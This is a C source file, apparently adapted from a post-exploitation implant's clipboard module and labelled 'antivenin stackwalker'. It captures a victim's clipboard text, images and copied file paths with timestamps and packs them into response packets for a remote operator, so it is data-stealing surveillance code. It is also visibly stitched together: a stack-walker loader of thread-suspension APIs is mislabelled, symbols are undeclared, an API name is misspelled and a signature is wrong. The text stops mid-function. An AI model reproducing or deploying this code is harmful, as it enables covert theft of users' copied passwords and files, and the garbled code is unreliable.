/*!
 * @file clipboard.c
 * @brief Definitions for clipboard interaction functionality.
 */
#include "dbghelp.h"
#include "antivenin.h"
#include "../../common/thread.h"

/*! @brief The different types of captures that the monitor supports. */
typedef enum _ClipboadrCaptureType
{
	CapText,                           ///! Capture is just plain text.
	CapFiles,                          ///! Capture is a list of one or more files.
	CapImage                           ///! Capture is an image.
} ClipboardCaptureType;

/*! @brief Container for image capture data. */
typedef struct _ClipboardImage
{
	DWORD dwWidth;                     ///! Width of the image.
	DWORD dwHeight;                    ///! Height of the image.
	DWORD dwImageSize;                 ///! Size of the image, in bytes.
	LPBYTE lpImageContent;             ///! Pointer to the image content.
} ClipboardImage;

/*! @brief Container for file capture data. */
typedef struct _ClipboardFile
{
	LPSTR lpPath;                      ///! Full path to the file.
	QWORD qwSize;                      ///! Size of the file in bytes.
	struct _ClipboardFile* pNext;      ///! Pointer to the next file in the copied batch.
} ClipboardFile;

/*! @brief Container for file capture data. */
typedef struct _ClipboardCapture
{
	ClipboardCaptureType captureType; ///! Indicates the type of capture for this entry.
	union
	{
		LPSTR lpText;                  ///! Set when the captureType is CapText.
		ClipboardImage* lpImage;       ///! Set when the captureType is CapImage.
		ClipboardFile* lpFiles;        ///! Set when the captureType is CapFile.
	};
	SYSTEMTIME stCaptureTime;          ///! The time that the clipboard entry was captured.
	DWORD dwSize;                      ///! Size of the clipboard entry.
	struct _ClipboardCapture* pNext;   ///! Pointer to the next captured clipboard entry.
} ClipboardCapture;

/*! @brief Container for the list of clipboard capture entries. */
typedef struct _ClipboardCaptureList
{
	ClipboardCapture* pHead;           ///! Pointer to the head of the capture list.
	ClipboardCapture* pTail;           ///! Pointer to the tail of the capture list.
	LOCK* pClipboardCaptureLock;       ///! Lock to handle concurrent access to the clipboard capture list.
	DWORD dwClipboardDataSize;         ///! Indication of how much data we have in memory.
} ClipboardCaptureList;

/*! @brief Container for clipboard monitor state. */
typedef struct _ClipboardState
{
#ifdef _WIN32
	char cbWindowClass[256];           ///! Name to use for the window class when registering the message-only window (usually random).
	HWND hClipboardWindow;             ///! Handle to the clipboard monitor window.
	HWND hNextViewer;                  ///! Handle to the next window in the clipboard chain.
	ClipboardCaptureList captureList;  ///! List of clipboard captures.
#endif
	BOOL bRunning;                     ///! Indicates if the thread is running or not.
	EVENT* hResponseEvent;             ///! Handle to the event that signals when the thread has actioned the caller's request.
	EVENT* hPauseEvent;                ///! Signalled when the caller wants the thread to pause.
	EVENT* hResumeEvent;               ///! Signalled when the caller wants the thread to resume.
	BOOL bCaptureImageData;            ///! Capture image data that's found on the clipboard.
	THREAD* hThread;                   ///! Reference to the clipboard monitor thread.
} ClipboardState;

/*! @brief Pointer to the state for the monitor thread. */
static ClipboardState* gClipboardState = NULL;
/*! @brief Flag indicating initialision status of the clipboard state. */
static BOOL gClipboardInitialised = FALSE;

#ifdef _WIN32

/* ### KERNEL32 ### */

/*! @brief GetNativeSystemInfo function pointer type. */
typedef VOID(WINAPI * PGETNATIVESYSTEMINFO)(LPSYSTEM_INFO lpSystemInfo);

/*! @brief IsWow64Process function pointer type. */
typedef BOOL(WINAPI * PISWOW64PROCESS)(HANDLE hProcess, BOOL IsWow64);

/*! @brief OpenProcess function pointer type. */
typedef HANDLE(WINAPI * POPENPROCESS)(DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD ProcessId);

/*! @brief OpenThread function pointer type. */
typedef HANDLE(WINAPI * POPENTHREAD)(DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD ThreadId);

/*! @brief SuspendThread function pointer type. */
typedef DWORD(WINAPI * PSUSPENDTHREAD)(HANDLE hThread);

/*! @brief Wow64SuspendThread function pointer type. */
typedef DWORD(WINAPI * PWOW64SUSPENDTHREAD)(HANDLE hThread);

/*! @brief GetThreadContext function pointer type. */
typedef BOOL(WINAPI * PGETTHREADCONTEXT)(HANDLE hThread, LPCONTEXT lpContext);

/*! @brief Wow64GetThreadContext function pointer type. */
typedef BOOL(WINAPI * PWOW64GETTHREADCONTEXT)(HANDLE hThread, PWOW64_CONTEXT lpContext);

/*! @brief GetThreadTimes function pointer type. */
typedef BOOL(WINAPI * PGETTHREADTIMES)(HANDLE hThread, LPFILETIME lpCreationTime, LPFILETIME lpExitTime, LPFILETIME lpKernelTime, LPFILETIME lpUserTime);

/*! @brief ResumeThread function pointer type. */
typedef DWORD(WINAPI * PRESUMETHREAD)(HANDLE hThread);

/*! @brief CloseHandle function pointer type. */
typedef BOOL(WINAPI * PCLOSEHANDLE)(HANDLE hObject);

/* ### DBGHELP ### */

/*! @brief SymInitialize function pointer type. */
typedef BOOL(WINAPI * PSYMINITIALIZE)(HANDLE hProcess);

/*! @brief SymCleanup function pointer type. */
typedef BOOL(WINAPI * PSYMCLEANUP)(HANDLE hProcess);

/*! @brief SymFunctionTableAccess64 function pointer type. */
typedef PVOID(WINAPI * PSYMFUNCTIONTABLEACCESS64)(HANDLE hProcess, DWORD64 AddrBase);

/*! @brief SymGetModuleBase64 function pointer type. */
typedef DWORD64(WINAPI * PSYMGETMODULEBASE64)(HANDLE hProcess, DWORD64 dwAddr);

/*! @brief SymLoadModuleEx function pointer type. */
typedef DWORD64(WINAPI * PSYMLOADMODULEEX)(HANDLE hProcess, HANDLE hFile, PCTSTR ImageName, PCTSTR ModuleName, DWORD64 BaseOfDll, 
	DWORD DllSize, PMODLOAD_DATA Data, DWORD Flags);

/*! @brief SymGetSymFromAddr64 function pointer type. */
typedef BOOL(WINAPI * PSYMGETSYMFROMADDR64)(HANDLE hProcess, DWORD64 Address, PDWORD64 Displacement, PIMAGEHLP_SYMBOL64 Symbol);

/*! @brief StackWalk64 function pointer type. */
typedef BOOL(WINAPI * PSTACKWALK64)(DWORD MachineType, HANDLE hProcess, HANDLE hThread, LPSTACKFRAME64 StackFrame, PVOID ContextRecord,
	PREAD_PROCESS_MEMORY_ROUTINE64 ReadMemoryRoutine, PSYMFUNCTIONTABLEACCESS64 FunctionTableAccessRoutine,
	PSYMGETMODULEBASE64 GetModuleBaseRoutine, PTRANSLATE_ADDRESS_ROUTINE64 TranslateAddress);

/* ### PSAPI ### */

/*! @brief EnumProcessModulesEx function pointer type. */
typedef BOOL(WINAPI * PENUMPROCESSMODULESEX)(HANDLE hProcess, HMODULE *lphModule, DWORD cb, LPDWORD lpcbNeeded, DWORD dwFilterFlag);

/*! @brief GetModuleBaseNameA function pointer type. */
typedef DWORD(WINAPI * PGETMODULEBASENAMEA)(HANDLE  hProcess, HMODULE hModule, LPTSTR lpBaseName, DWORD nSize);

/*! @brief GetModuleFileNameExA function pointer type. */
typedef DWORD(WINAPI * PGETMODULEFILENAMEEXA)(HANDLE hProcess, HMODULE hModule, LPSTR lpFilename, DWORD nSize);

/*! @brief GetModuleInformation function pointer type. */
typedef BOOL(WINAPI * PGETMODULEINFORMATION)(HANDLE hProcess, HMODULE hModule, LPMODULEINFO lpModuleInfo, DWORD nSize);

static PGETNATIVESYSTEMINFO pGetNativeSystemInfo = NULL;
static PISWOW64PROCESS pIsWow64Process = NULL;
static POPENPROCESS pOpenProcess = NULL;
static POPENTHREAD pOpenThread = NULL;
static PGETTHREADTIMES pGetThreadTimes = NULL;
static PSUSPENDTHREAD pSuspendThread = NULL;
static PWOW64SUSPENDTHREAD pWow64SuspendThread = NULL;
static PGETTHREADCONTEXT pGetThreadContext = NULL;
static PWOW64GETTHREADCONTEXT pWow64GetThreadContext = NULL;
static PRESUMETHREAD pResumeThread = NULL;
static PCLOSEHANDLE pCloseHandle = NULL;

static PSYMINITIALIZE pSymInitialize = NULL;
static PSYMCLEANUP pSymCleanup = NULL;
static PSYMFUNCTIONTABLEACCESS64 pSymFunctionTableAccess64 = NULL;
static PSYMGETMODULEBASE64 pSymGetModuleBase64 = NULL;
static PSYMLOADMODULEEX pSymLoadModuleEx = NULL;
static PSYMGETSYMFROMADDR64 pSymGetSymFromAddr64 = NULL;
static PSTACKWALK64 pStackWalk64 = NULL;

static PENUMPROCESSMODULESEX pEnumProcessModulesEx = NULL;
static PGETMODULEBASENAMEA pGetModuleBaseNameA = NULL;
static PGETMODULEFILENAMEEXA pGetModuleFileNameExA = NULL;
static PGETMODULEINFORMATION pGetModuleInformation = NULL;

/*!
 * @brief Initialises the clipboard functionality for use.
 * @remark This function has the job of finding all the stackwalker related function pointers.
 * @returns An indication of success or failure.
 */
DWORD initialize_stackwalker()
{
#ifdef _WIN32
	DWORD dwResult;
	HMODULE hKernel32 = NULL;
	HMODULE hDbghelp = NULL;
	HMODULE hPsapi = NULL;

	do
	{
		dprintf("[ANTIVENIN STACKWALKER] Loading kernel32.dll");
		if ((hKernel32 = LoadLibraryA("kernel32.dll")) == NULL)
		{
			BREAK_ON_ERROR("[ANTIVENIN STACKWALKER] Unable to load kernel32.dll");
		}

		dprintf("[ANTIVENIN STACKWALKER] Loading dbghelp.dll");
		if ((hDbghelp = LoadLibraryA("dbghelp.dll")) == NULL)
		{
			BREAK_ON_ERROR("[ANTIVENIN STACKWALKER] Unable to load dbghelp.dll");
		}

		if ((hPsapi = LoadLibraryA("psapi.dll")) == NULL)
		{
			BREAK_ON_ERROR("[ANTIVENIN STACKWALKER] Unable to load psapi.dll");
		}

		dprintf("[ANTIVENIN STACKWALKER] Searching for GetNativeSystemInfo");
		if ((pGetNativeSystemInfo = (PGETNATIVESYSTEMINFO)GetProcAddress(hKernel32, "GetNativeSystemInfo")) == NULL)
		{
			BREAK_ON_ERROR("[ANTIVENIN STACKWALKER] Unable to locate GetNativeSystemInfo in kernel32.dll");
		}

		dprintf("[ANTIVENIN STACKWALKER] Searching for IsWow64Process");
		if ((pIsWow64Process = (PISWOW64PROCESS)GetProcAddress(hKernel32, "IsWow64Process")) == NULL)
		{
			BREAK_ON_ERROR("[ANTIVENIN STACKWALKER] Unable to locate IsWow64Process in kernel32.dll");
		}

		dprintf("[ANTIVENIN STACKWALKER] Searching for OpenProcess");
		if ((pOpenProcess = (POPENPROCESS)GetProcAddress(hKernel32, "OpenProcess")) == NULL)
		{
			BREAK_ON_ERROR("[ANTIVENIN STACKWALKER] Unable to locate OpenProcess in kernel32.dll");
		}

		dprintf("[ANTIVENIN STACKWALKER] Searching for OpenThread");
		if ((pOpenThread = (POPENTHREAD)GetProcAddress(hKernel32, "OpenThread")) == NULL)
		{
			BREAK_ON_ERROR("[ANTIVENIN STACKWALKER] Unable to locate OpenThread in kernel32.dll");
		}

		dprintf("[ANTIVENIN STACKWALKER] Searching for GetThreadTimes");
		if ((pGetThreadTimes = (PGETTHREADTIMES)GetProcAddress(hKernel32, "GetThreadTimes")) == NULL)
		{
			BREAK_ON_ERROR("[ANTIVENIN STACKWALKER] Unable to locate GetThreadTimes in kernel32.dll");
		}

		dprintf("[ANTIVENIN STACKWALKER] Searching for SuspendThread");
		if ((pSuspendThread = (PSUSPENDTHREAD)GetProcAddress(hKernel32, "SuspendThread")) == NULL)
		{
			BREAK_ON_ERROR("[ANTIVENIN STACKWALKER] Unable to locate SuspendThread in kernel32.dll");
		}

		dprintf("[ANTIVENIN STACKWALKER] Searching for Wow64SuspendThread");
		if ((pWow64SuspendThread = (PWOW64SUSPENDTHREAD)GetProcAddress(hKernel32, "WowSuspendThread")) == NULL)
		{
			BREAK_ON_ERROR("[ANTIVENIN STACKWALKER] Unable to locate Wow64SuspendThread in kernel32.dll");
		}

		dprintf("[ANTIVENIN STACKWALKER] Searching for GetThreadContext");
		if ((pGetThreadContext = (PGETTHREADCONTEXT)GetProcAddress(hKernel32, "GetThreadContext")) == NULL)
		{
			BREAK_ON_ERROR("[ANTIVENIN STACKWALKER] Unable to locate GetThreadContext in kernel32.dll");
		}

		dprintf("[ANTIVENIN STACKWALKER] Searching for Wow64GetThreadContext");
		if ((pWow64GetThreadContext = (PWOW64GETTHREADCONTEXT)GetProcAddress(hKernel32, "Wow64GetThreadContext")) == NULL)
		{
			BREAK_ON_ERROR("[ANTIVENIN STACKWALKER] Unable to locate Wow64GetThreadContext in kernel32.dll");
		}

		dprintf("[ANTIVENIN STACKWALKER] Searching for ResumeThread");
		if ((pResumeThread = (PRESUMETHREAD)GetProcAddress(hKernel32, "ResumeThread")) == NULL)
		{
			BREAK_ON_ERROR("[ANTIVENIN STACKWALKER] Unable to locate ResumeThread in kernel32.dll");
		}

		dprintf("[ANTIVENIN STACKWALKER] Searching for CloseHandle");
		if ((pCloseHandle = (PCLOSEHANDLE)GetProcAddress(hKernel32, "CloseHandle")) == NULL)
		{
			BREAK_ON_ERROR("[ANTIVENIN STACKWALKER] Unable to locate CloseHandle in kernel32.dll");
		}

		dprintf("[ANTIVENIN STACKWALKER] Searching for SymInitialize");
		if ((pSymInitialize = (PSYMINITIALIZE)GetProcAddress(hDbghelp, "SymInitialize")) == NULL)
		{
			BREAK_ON_ERROR("[ANTIVENIN STACKWALKER] Unable to locate SymInitialize in dbghelp.dll");
		}

		dprintf("[ANTIVENIN STACKWALKER] Searching for SymCleanup");
		if ((pSymCleanup = (PSYMCLEANUP)GetProcAddress(hDbghelp, "SymCleanup")) == NULL)
		{
			BREAK_ON_ERROR("[ANTIVENIN STACKWALKER] Unable to locate SymCleanup in dbghelp.dll");
		}

		dprintf("[ANTIVENIN STACKWALKER] Searching for SymFunctionTableAccess64");
		if ((pSymFunctionTableAccess64 = (PSYMFUNCTIONTABLEACCESS64)GetProcAddress(hDbghelp, "SymFunctionTableAccess64")) == NULL)
		{
			BREAK_ON_ERROR("[ANTIVENIN STACKWALKER] Unable to locate SymFunctionTableAccess64 in dbghelp.dll");
		}

		dprintf("[ANTIVENIN STACKWALKER] Searching for SymGetModuleBase64");
		if ((pSymGetModuleBase64 = (PSYMGETMODULEBASE64)GetProcAddress(hDbghelp, "SymGetModuleBase64")) == NULL)
		{
			BREAK_ON_ERROR("[ANTIVENIN STACKWALKER] Unable to locate SymGetModuleBase64 in dbghelp.dll");
		}

		dprintf("[ANTIVENIN STACKWALKER] Searching for SymLoadModuleEx");
		if ((pSymLoadModuleEx = (PSYMLOADMODULEEX)GetProcAddress(hDbghelp, "SymLoadModuleEx")) == NULL)
		{
			BREAK_ON_ERROR("[ANTIVENIN STACKWALKER] Unable to locate SymLoadModuleEx in dbghelp.dll");
		}

		dprintf("[ANTIVENIN STACKWALKER] Searching for SymGetSymFromAddr64");
		if ((pSymGetSymFromAddr64 = (PSYMGETSYMFROMADDR64)GetProcAddress(hDbghelp, "SymGetSymFromAddr64")) == NULL)
		{
			BREAK_ON_ERROR("[ANTIVENIN STACKWALKER] Unable to locate SymGetSymFromAddr64 in dbghelp.dll");
		}

		dprintf("[ANTIVENIN STACKWALKER] Searching for StackWalk64");
		if ((pStackWalk64 = (PSTACKWALK64)GetProcAddress(hDbghelp, "StackWalk64")) == NULL)
		{
			BREAK_ON_ERROR("[ANTIVENIN STACKWALKER] Unable to locate StackWalk64 in dbghelp.dll");
		}

		dprintf("[ANTIVENIN STACKWALKER] Searching for EnumProcessModulesEx");
		if ((pEnumProcessModulesEx = (PENUMPROCESSMODULESEX)GetProcAddress(hPsapi, "EnumProcessModulesEx")) == NULL)
		{
			BREAK_ON_ERROR("[ANTIVENIN STACKWALKER] Unable to locate EnumProcessModulesEx in psapi.dll");
		}

		dprintf("[ANTIVENIN STACKWALKER] Searching for GetModuleBaseNameA");
		if ((pGetModuleBaseNameA = (PGETMODULEBASENAMEA)GetProcAddress(hPsapi, "GetModuleBaseNameA")) == NULL)
		{
			BREAK_ON_ERROR("[ANTIVENIN STACKWALKER] Unable to locate GetModuleBaseNameA in psapi.dll");
		}

		dprintf("[ANTIVENIN STACKWALKER] Searching for GetModuleFileNameExA");
		if ((pGetModuleFileNameExA = (PGETMODULEFILENAMEEXA)GetProcAddress(hPsapi, "GetModuleFileNameExA")) == NULL)
		{
			BREAK_ON_ERROR("[ANTIVENIN STACKWALKER] Unable to locate GetModuleFileNameExA in psapi.dll");
		}

		dprintf("[ANTIVENIN STACKWALKER] Searching for GetModuleInformation");
		if ((pGetModuleInformation = (PGETMODULEINFORMATION)GetProcAddress(hPsapi, "GetModuleInformation")) == NULL)
		{
			BREAK_ON_ERROR("[ANTIVENIN STACKWALKER] Unable to locate GetModuleInformation in psapi.dll");
		}

		dprintf("[ANTIVENIN STACKWALKER] Searching for GlobalFree");
		if ((pGlobalFree = (PGLOBALFREE)GetProcAddress(hKernel32, "GlobalFree")) == NULL)
		{
			BREAK_ON_ERROR("[ANTIVENIN STACKWALKER] Unable to locate GlobalFree in kernel32.dll");
		}

		dwResult = ERROR_SUCCESS;
		gStackWalkerInitialized = TRUE;
	} while (0);

	return dwResult;
#else
	return ERROR_NOT_SUPPORTED;
#endif
}

/*!
 * @brief Clean up the list of captures in the given list of captures.
 * @param pCaptureList Pointer to the list of captures to clean up.
 * @param bRemoveLock If \c TRUE, remove the list capture lock.
 * @remark This iterates through the list and correctly frees up all the
 *         resources used by the list.
 */
VOID destroy_clipboard_monitor_capture(ClipboardCaptureList* pCaptureList, BOOL bRemoveLock)
{
	ClipboardFile* pFile, *pNextFile;

	while (pCaptureList->pHead)
	{
		pCaptureList->pTail = pCaptureList->pHead->pNext;

		switch (pCaptureList->pHead->captureType)
		{
		case CapText:
			free(pCaptureList->pHead->lpText);
			break;
		case CapImage:
			free(pCaptureList->pHead->lpImage->lpImageContent);
			free(pCaptureList->pHead->lpImage);
			break;
		case CapFiles:
			pFile = pCaptureList->pHead->lpFiles;

			while (pFile)
			{
				pNextFile = pFile->pNext;
				free(pFile->lpPath);
				free(pFile);
				pFile = pNextFile;
			}
			break;
		}

		free(pCaptureList->pHead);

		pCaptureList->pHead = pCaptureList->pTail;
	}

	if (bRemoveLock && pCaptureList->pClipboardCaptureLock)
	{
		lock_destroy(pCaptureList->pClipboardCaptureLock);
		pCaptureList->pClipboardCaptureLock = NULL;
	}

	pCaptureList->pHead = pCaptureList->pTail = NULL;
	pCaptureList->dwClipboardDataSize = 0;
}

/*!
 * @brief Convert a timestamp value to a string in the form YYYY-MM-DD HH:mm:ss.ffff
 * @param pTime Pointer to the \c SYSTEMTIME structure to convert.
 * @param buffer Pointer to the buffer that will receive the time value.
 */
VOID timestamp_to_string(SYSTEMTIME* pTime, char buffer[40])
{
	dprintf("[ANTIVENIN STACKWALKER] parsing timestamp %p", pTime);
	sprintf_s(buffer, 40, "%04u-%02u-%02u %02u:%02u:%02u.%04u",
		pTime->wYear, pTime->wMonth, pTime->wDay,
		pTime->wHour, pTime->wMinute, pTime->wSecond, pTime->wMilliseconds);
	dprintf("[ANTIVENIN STACKWALKER] timestamp parsed");
}

/*!
 * @brief Dump all the captured clipboard data to the given packet.
 * @param pResponse pointer to the response \c Packet that the data needs to be written to.
 * @param pCapture Pointer to the clipboard capture item to dump.
 * @param bCaptureImageData Indication of whether to include image data in the capture.
 */
VOID dump_clipboard_capture(Packet* pResponse, ClipboardCapture* pCapture, BOOL bCaptureImageData)
{
	ClipboardFile* pFile;
	Packet* group = packet_create_group();
	TlvType groupType;
	Packet* file = NULL;
	char timestamp[40];

	dprintf("[ANTIVENIN STACKWALKER] Dumping clipboard capture");

	memset(timestamp, 0, sizeof(timestamp));

	timestamp_to_string(&pCapture->stCaptureTime, timestamp);
	packet_add_tlv_string(group, TLV_TYPE_EXT_CLIPBOARD_TYPE_TIMESTAMP, timestamp);
	dprintf("[ANTIVENIN STACKWALKER] Timestamp added: %s", timestamp);

	switch (pCapture->captureType)
	{
	case CapText:
		dprintf("[ANTIVENIN STACKWALKER] Dumping text %s", pCapture->lpText);
		packet_add_tlv_string(group, TLV_TYPE_EXT_CLIPBOARD_TYPE_TEXT_CONTENT, (PUCHAR)(pCapture->lpText ? pCapture->lpText : "(null - clipboard was cleared)"));
		groupType = TLV_TYPE_EXT_CLIPBOARD_TYPE_TEXT;
		break;
	case CapImage:
		dprintf("[ANTIVENIN STACKWALKER] Dumping image %ux%x", pCapture->lpImage->dwWidth, pCapture->lpImage->dwHeight);
		packet_add_tlv_uint(group, TLV_TYPE_EXT_CLIPBOARD_TYPE_IMAGE_JPG_DIMX, pCapture->lpImage->dwWidth);
		packet_add_tlv_uint(group, TLV_TYPE_EXT_CLIPBOARD_TYPE_IMAGE_JPG_DIMY, pCapture->lpImage->dwHeight);
		packet_add_tlv_raw(group, TLV_TYPE_EXT_CLIPBOARD_TYPE_IMAGE_JPG_DATA, pCapture->lpImage->lpImageContent, pCapture->lpImage->dwImageSize);
		groupType = TLV_TYPE_EXT_CLIPBOARD_TYPE_IMAGE_JPG;
		break;
	case CapFiles:
		pFile = pCapture->lpFiles;

		while (pFile)
		{
			dprintf("[ANTIVENIN STACKWALKER] Dumping file %p", pFile);
			file = packet_create_group();

			dprintf("[ANTIVENIN STACKWALKER] Adding path %s", pFile->lpPath);
			packet_add_tlv_string(file, TLV_TYPE_EXT_CLIPBOARD_TYPE_FILE_NAME, pFile->lpPath);

			dprintf("[ANTIVENIN STACKWALKER] Adding size %llu", htonq(pFile->qwSize));
			packet_add_tlv_qword(file, TLV_TYPE_EXT_CLIPBOARD_TYPE_FILE_SIZE, pFile->qwSize);

			dprintf("[ANTIVENIN STACKWALKER] Adding group");
			packet_add_group(group, TLV_TYPE_EXT_CLIPBOARD_TYPE_FILE, file);

			pFile = pFile->pNext;
			dprintf("[ANTIVENIN STACKWALKER] Moving to next");
		}
		groupType = TLV_TYPE_EXT_CLIPBOARD_TYPE_FILES;
		break;
	}

	packet_add_group(pResponse, groupType, group);
}

/*!
 * @brief Dump the given clipboard capture list to the specified response.
 * @param pResponse Pointer to the response \c Packet to write the data to.
 * @param pCaptureList Pointer to the list of captures to iterate over and write to the packet.
 * @param bCaptureImageData Indication of whether to include image data in the dump.
 * @param bPurge Indication of whether to purge the contents of the list once dumped.
 * @remark if \c bPurge is \c TRUE the list of capture data is cleared and freed after dumping.
 */
VOID dump_clipboard_capture_list(Packet* pResponse, ClipboardCaptureList* pCaptureList, BOOL bCaptureImageData, BOOL bPurge)
{
	ClipboardCapture* pCapture = NULL;

	lock_acquire(pCaptureList->pClipboardCaptureLock);
	pCapture = pCaptureList->pHead;
	while (pCapture)
	{
		dump_clipboard_capture(pResponse, pCapture, bCaptureImageData);
		pCapture = pCapture->pNext;
	}

	if (bPurge)
	{
		destroy_clipboard_monitor_capture(pCaptureList, FALSE);
	}
	lock_release(pCaptureList->pClipboardCaptureLock);
}

/*!
 * @brief Determine if a capture is a duplicate based on the previously captured element.
 * @param pNewCapture Pointer to the new capture value.
 * @param pList Pointer to the capture list of existing captures.
 * @retval TRUE if the contents of \c pNewCapture are the same as the last element in \c pList.
 * @retval FALSE if the contents of \c pNewCapture are not the same as the last element in \c pList.
 * @remark This is quite "dumb" and will only check agains the previous value in the list. The goal
 *         is to reduce fat-fingering copies and reduce the size of the data coming back. If people
 *         copy the same data multiple times at different times then we want to capture that in the
 *         timeline. Comparison is just a byte-for-byte compare.
 */
BOOL is_duplicate(ClipboardCapture* pNewCapture, ClipboardCaptureList* pList)
{
	ClipboardFile* pTailFiles = NULL;
	ClipboardFile* pNewFiles = NULL;
	BOOL bResult = FALSE;

	lock_acquire(pList->pClipboardCaptureLock);

	do
	{
		if (pList->pTail == NULL)
		{
			break;
		}

		if (pList->pTail->captureType != pNewCapture->captureType)
		{
			break;
		}

		switch (pNewCapture->captureType)
		{
			case CapText:
			{
				if (lstrcmpA(pNewCapture->lpText, pList->pTail->lpText) == 0)
				{
					bResult = TRUE;
				}
				break;
			}
			case CapFiles:
			{
				pTailFiles = pList->pTail->lpFiles;
				pNewFiles = pNewCapture->lpFiles;

				while (pTailFiles != NULL && pNewFiles != NULL)
				{
					if (pTailFiles->qwSize != pNewFiles->qwSize
						|| lstrcmpA(pTailFiles->lpPath, pNewFiles->lpPath) != 0)
					{
						break;
					}
					pTailFiles = pTailFiles->pNext;
					pNewFiles = pNewFiles->pNext;
				}

				if (pTailFiles == NULL && pNewFiles == NULL)
				{
					// we got to the end without an early-out, and the lists are
					// the same size, so, they're the same!
					bResult = TRUE;
				}

				break;
			}
			case CapImage:
			{
				if (pNewCapture->dwSize == pList->pTail->dwSize
					 && pNewCapture->lpImage->dwHeight == pList->pTail->lpImage->dwHeight
					 && pNewCapture->lpImage->dwWidth == pList->pTail->lpImage->dwWidth)
				{
					// looking quite similar. if no content given we'll assume different because
					// there's little to no damage in recording an extra copy and paste of an image
					// without storing the data. So only when they're both non-null will we continue.
					if (pNewCapture->lpImage->lpImageContent != NULL
						&& pList->pTail->lpImage->lpImageContent != NULL)
					{
						if (memcmp(pNewCapture->lpImage->lpImageContent, pList->pTail->lpImage->lpImageContent, pNewCapture->lpImage->dwImageSize) == 0)
						{
							bResult = TRUE;
						}
					}
				}
				break;
			}
		}
	} while (0);

	lock_release(pList->pClipboardCaptureLock);

	return bResult;
}

/*!
 * @brief Add a new capture to the list of clipboard captures.
 * @param pNewCapture The newly captured clipboard data to add.
 * @param pList Pointer to the list of captures to add the item to.
 * @returns Indcation of whether the value was added.
 * @retval FALSE Indicates that the value was a duplicate, and not added again.
 */
BOOL add_clipboard_capture(ClipboardCapture* pNewCapture, ClipboardCaptureList* pList)
{
	if (is_duplicate(pNewCapture, pList))
	{
		return FALSE;
	}

	lock_acquire(pList->pClipboardCaptureLock);

	pNewCapture->pNext = NULL;
	if (pList->pTail == NULL)
	{
		pList->pHead = pList->pTail = pNewCapture;
	}
	else
	{
		pList->pTail->pNext = pNewCapture;
		pList->pTail = pList->pTail->pNext = pNewCapture;
	}
	pList->dwClipboardDataSize += pNewCapture->dwSize;
	lock_release(pList->pClipboardCaptureLock);
	return TRUE;
}

/*!
 * @brief Capture data that is currently on the clipboard.
 * @param bCaptureImageData Indication of whether to include image data in the capture.
 * @param ppCapture Pointer that will receive a pointer to the newly captured data.
 * @returns Indication of success or failure.
 * @remark If \c ppCapture contains a value when the function returns, the caller needs
 *         to call \c free() on that value later when it finished.
 */
DWORD capture_clipboard(BOOL bCaptureImageData, ClipboardCapture** ppCapture)
{
	DWORD dwResult;
	DWORD dwCount;
	HANDLE hSourceFile = NULL;
	PCHAR lpClipString = NULL;
	HGLOBAL hClipboardData = NULL;
	HDROP hFileDrop = NULL;
	UINT uFormat = 0;
	UINT uFileIndex = 0;
	UINT uFileCount = 0;
	CHAR lpFileName[MAX_PATH];
	LARGE_INTEGER largeInt = { 0 };
	LPBITMAPINFO lpBI = NULL;
	PUCHAR lpDIB = NULL;
	ConvertedImage image;
	ClipboardFile* pFile = NULL;
	ClipboardCapture* pCapture = (ClipboardCapture*)malloc(sizeof(ClipboardCapture));

	memset(pCapture, 0, sizeof(ClipboardCapture));

	pCapture->pNext = NULL;
	dprintf("[ANTIVENIN STACKWALKER] Getting timestamp");
	GetSystemTime(&pCapture->stCaptureTime);
	do
	{
		// Try to get a lock on the clipboard
		if (!pOpenClipboard(NULL))
		{
			dwResult = GetLastError();
			BREAK_WITH_ERROR("[ANTIVENIN STACKWALKER] Unable to open the clipboard", dwResult);
		}

		dprintf("[ANTIVENIN STACKWALKER] Clipboard locked, attempting to get data...");

		while (uFormat = pEnumClipboardFormats(uFormat))
		{
			if (uFormat == CF_TEXT)
			{
				// there's raw text on the clipboard
				if ((hClipboardData = pGetClipboardData(CF_TEXT)) != NULL
					&& (lpClipString = (PCHAR)pGlobalLock(hClipboardData)) != NULL)
				{
					dprintf("[ANTIVENIN STACKWALKER] Clipboard text captured: %s", lpClipString);
					pCapture->captureType = CapText;
					dwCount = lstrlenA(lpClipString) + 1;
					pCapture->lpText = (char*)malloc(dwCount);
					memset(pCapture->lpText, 0, dwCount);
					strncpy_s(pCapture->lpText, dwCount, lpClipString, dwCount - 1);
					pCapture->dwSize = dwCount;

					pGlobalUnlock(hClipboardData);
				}
			}
			else if (uFormat == CF_DIB)
			{
				dprintf("[ANTIVENIN STACKWALKER] Grabbing the clipboard bitmap data");
				// an image of some kind is on the clipboard
				if ((hClipboardData = pGetClipboardData(CF_DIB)) != NULL
					&& (lpBI = (LPBITMAPINFO)pGlobalLock(hClipboardData)) != NULL)
				{
					dprintf("[ANTIVENIN STACKWALKER] CF_DIB grabbed, extracting dimensions.");

					// grab the bitmap image size
					pCapture->captureType = CapImage;
					pCapture->lpImage = (ClipboardImage*)malloc(sizeof(ClipboardImage));
					memset(pCapture->lpImage, 0, sizeof(ClipboardImage));
					pCapture->lpImage->dwWidth = lpBI->bmiHeader.biWidth;
					pCapture->lpImage->dwHeight = lpBI->bmiHeader.biHeight;

					// throw together a basic guess for this, it doesn't have to be exact.
					pCapture->dwSize = lpBI->bmiHeader.biWidth * lpBI->bmiHeader.biHeight * 4;

					// only download the image if they want it
					dprintf("[ANTIVENIN STACKWALKER] Image is %dx%d and %s be downloaded", lpBI->bmiHeader.biWidth, lpBI->bmiHeader.biHeight,
						bCaptureImageData ? "WILL" : "will NOT");

					if (bCaptureImageData)
					{
						lpDIB = ((PUCHAR)lpBI) + get_bitmapinfo_size(lpBI, TRUE);

						// TODO: add the ability to encode with multiple encoders and return the smallest image.
						if (convert_to_jpg(lpBI, lpDIB, 75, &image) == ERROR_SUCCESS)
						{
							dprintf("[ANTIVENIN STACKWALKER] Clipboard bitmap captured to image: %p, Size: %u bytes", image.pImageBuffer, image.dwImageBufferSize);
							pCapture->lpImage->lpImageContent = image.pImageBuffer;
							pCapture->lpImage->dwImageSize = image.dwImageBufferSize;
							pCapture->dwSize = image.dwImageBufferSize;

							// Just leaving this in for debugging purposes later on
							//hSourceFile = CreateFileA("C:\\temp\\foo.jpg", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
							//WriteFile(hSourceFile, image.pImageBuffer, image.dwImageBufferSize, &largeInt.LowPart, NULL);
							//CloseHandle(hSourceFile);
						}
						else
						{
